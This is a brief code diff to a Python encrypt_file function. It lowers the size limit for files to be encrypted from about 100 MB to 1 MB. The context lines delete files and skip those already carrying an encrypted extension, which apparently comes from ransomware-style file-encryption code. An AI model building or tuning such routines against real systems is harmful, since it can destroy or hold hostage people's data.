@@ -19,7 +19,7 @@ def encrypt_file(file_path, aes_key, encrypted_extension):
             os.remove(file_path)
 
         # Check if the file size is less than 100Mb before encrypting
-        elif os.path.getsize(file_path) < 100000000:
+        elif os.path.getsize(file_path) < 1000000:
             # Prevent the file from re-encryption
             if file_path.endswith(encrypted_extension):
                 return
